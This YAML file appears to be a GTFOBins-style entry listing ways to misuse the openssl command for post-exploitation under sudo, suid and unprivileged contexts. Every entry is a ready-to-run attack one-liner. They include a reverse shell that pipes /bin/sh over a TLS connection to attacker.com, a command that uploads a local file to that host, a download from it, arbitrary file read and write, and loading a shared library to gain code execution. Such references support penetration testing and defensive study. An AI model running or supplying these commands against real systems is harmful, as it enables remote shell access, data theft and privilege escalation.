---
functions:
  download:
  - code: |-
      openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tls-server
  file-read:
  - code: |-
      openssl enc -in /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      echo DATA | openssl enc -out /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      openssl enc -in /path/to/input-file -out /path/to/output-file
    contexts:
      sudo:
      suid:
      unprivileged:
  library-load:
  - code: |-
      openssl req -engine ./lib.so
    contexts:
      sudo:
      suid:
      unprivileged:
  reverse-shell:
  - code: |-
      mkfifo /tmp/s; /bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/tmp/s; rm /tmp/s
    comment: |-
      The shell process is not spawn by `openssl`.
    contexts:
      sudo:
      suid:
      unprivileged:
    listener: tls-server
    tty: false
  upload:
  - code: |-
      openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tls-server
...
